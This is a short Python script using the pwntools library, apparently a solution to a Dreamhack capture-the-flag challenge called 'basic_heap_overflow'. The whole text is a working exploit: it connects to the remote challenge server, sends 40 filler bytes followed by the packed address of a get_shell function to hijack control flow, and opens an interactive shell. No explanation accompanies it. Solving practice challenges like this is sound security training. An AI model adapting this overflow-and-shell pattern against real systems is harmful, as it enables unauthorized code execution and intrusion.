from pwn import *

#p = process('./basic_heap_overflow')
p = remote('host3.dreamhack.games', 10797)

get_shell = 0x0804867b
payload = b'A' * 40 + p32(get_shell)

p.sendline(payload)
p.interactive()